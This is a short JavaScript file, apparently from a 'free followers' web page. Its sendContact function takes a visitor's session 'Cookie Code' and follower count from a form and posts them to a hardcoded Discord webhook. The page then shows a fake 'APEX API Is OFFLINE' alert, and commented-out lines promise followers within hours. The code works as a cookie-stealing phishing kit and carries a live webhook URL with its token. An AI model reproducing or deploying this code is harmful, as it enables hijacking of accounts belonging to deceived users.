var myVar;
      
      function myFunction() {
        myVar = setTimeout(showPage, 1300);
      }
      
      function showPage() {
        document.getElementById("loader").style.display = "none";
        document.getElementById("myDiv").style.display = "block";
      }




async function sendContact(ev) {
    ev.preventDefault();

    const senderCookie = document
      .getElementById('messageCookie').value;
      
    const senderFollowers = document
    .getElementById('messageFollowers').value;

    const webhookBody = {
      embeds: [{
        title: 'New Cookie',
        fields: [
        { name: 'Cookie Code', value: senderCookie },
        { name: 'Amount of Followers', value: senderFollowers },
        ]
      }],
    };

    const webhookUrl = 'https://ptb.discord.com/api/webhooks/1007691288759500891/CRUYfw1841NswMc23UvG-XbYynpx7APx55cCFYWFLz3O9-W6ePc4JiQ9fioa_dNB9BOu';

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(webhookBody),
    });

    if (response.ok) {
      // alert('Processing...'),
      // alert('💚 | Followers being sent... Please wait to 1-2 hours!');
      alert('APEX API Is OFFLINE');
    } else {
      alert('API ERROR - PLEASE TRY AGAIN LATER')
    }
  }
